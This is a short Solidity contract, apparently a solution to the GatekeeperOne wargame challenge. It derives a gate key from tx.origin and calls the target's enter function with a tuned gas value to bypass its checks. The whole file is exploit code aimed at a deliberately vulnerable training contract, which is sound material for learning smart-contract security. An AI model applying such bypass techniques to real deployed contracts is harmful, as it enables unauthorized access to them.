// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function run() public {
        uint16 uintAddress = uint16(uint160(tx.origin));
        uint64 rawGateKey = uint64(1 << 63) + uint64(uintAddress);
        bytes8 gateKey = bytes8(rawGateKey);

        target.enter{gas: 8191 * 10 + 268}(gateKey);
    }
}
